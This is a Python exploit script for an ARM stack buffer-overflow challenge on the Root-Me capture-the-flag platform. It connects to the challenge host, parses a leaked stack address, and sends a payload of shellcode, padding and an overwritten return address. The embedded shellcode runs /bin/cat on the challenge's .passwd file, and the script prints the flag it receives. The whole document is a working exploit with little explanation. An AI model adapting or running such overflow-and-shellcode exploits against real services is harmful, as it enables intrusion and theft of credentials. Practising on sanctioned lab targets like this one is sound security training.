import socket
import struct
shellcode =  b'\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x24\x33\x78\x46\x16\x30\x92\x1a\x02\x72\x05\x1c\x2c\x35\x2a\x70\x69\x46\x4b\x60\x8a\x60\x08\x60\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x63\x61\x74\x5a\x2f\x63\x68\x61\x6c\x6c\x65\x6e\x67\x65\x2f\x61\x70\x70\x2d\x73\x79\x73\x74\x65\x6d\x65\x2f\x63\x68\x34\x35\x2f\x2e\x70\x61\x73\x73\x77\x64'

sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.connect(('challenge04.root-me.org',61045))
garbage = sock.recv(1024)
sock.send(b'A\n')

result = struct.pack("I",int(sock.recv(1024).decode()[2:-2], 16 )) # Leak the stack adress 
payload =shellcode + b'A'*(164-len(shellcode)) + result + b'\n' # placing the shellcode at the beginning of our buffer 
garbage = sock.recv(1024) # Do you wanna dump again 
sock.send(b'y\n') 
garabage=sock.recv(1024) # Give me data to dump again 


sock.send(payload) 
sock.recv(1024) # Data Dumped 

garbage= sock.recv(2048).decode() # dump again (y/n)
sock.send(b'n\n') 
flag=sock.recv(1024)

print(flag.decode())
